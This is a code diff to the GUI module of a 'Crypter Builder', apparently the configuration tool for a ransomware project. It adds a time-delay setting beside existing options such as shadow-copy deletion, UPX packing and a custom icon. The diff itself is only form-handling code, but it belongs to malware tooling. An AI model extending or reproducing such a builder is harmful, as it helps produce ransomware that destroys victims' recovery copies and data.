@@ -1,4 +1,3 @@
-# -*- coding: utf-8 -*-
 '''
 @summary: Crypter Builder: Provides GUI functionality
 @author: MLS
@@ -122,6 +121,11 @@ class Gui(MainFrame):
             self.OpenGuiOnLoginCheckbox.SetValue(config_dict["open_gui_on_login"])
         else:
             self.OpenGuiOnLoginCheckbox.SetValue(BUILDER_CONFIG_ITEMS["open_gui_on_login"]["default"])
+        # Time Delay
+        if "time_delay" in config_dict:
+            self.TimeDelayTextCtrl.SetValue(config_dict["time_delay"])
+        else:
+            self.TimeDelayTextCtrl.SetValue("")
         # Delete Shadow Copies
         if "delete_shadow_copies" in config_dict:
             self.DeleteShadowCopiesCheckbox.SetValue(config_dict["delete_shadow_copies"])
@@ -456,6 +460,8 @@ class Gui(MainFrame):
         user_input_dict["icon_file"] = self.IconFilePicker.GetPath()
         # Open GUI On Login
         user_input_dict["open_gui_on_login"] = self.OpenGuiOnLoginCheckbox.IsChecked()
+        # Time Delay
+        user_input_dict["time_delay"] = self.TimeDelayTextCtrl.GetValue()
         # GUI Title
         user_input_dict["gui_title"] = self.GuiTitleTextCtrl.GetValue()
         # UPX Packer Dir
